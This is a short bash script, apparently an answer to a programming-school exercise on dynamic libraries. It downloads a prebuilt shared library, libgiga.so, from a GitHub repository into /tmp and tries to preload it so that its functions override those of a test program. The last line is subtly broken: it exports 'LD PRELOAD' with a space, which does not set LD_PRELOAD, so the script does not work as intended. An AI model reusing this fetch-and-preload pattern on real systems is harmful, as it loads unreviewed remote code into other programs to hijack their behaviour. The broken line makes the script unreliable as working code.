#!/bin/bash
wget -P /tmp https://github.com/Rna-Tariq/alx-low_level_programming/raw/master/0x18-dynamic_libraries/libgiga.so
export LD PRELOAD=/tmp/libgiga.so

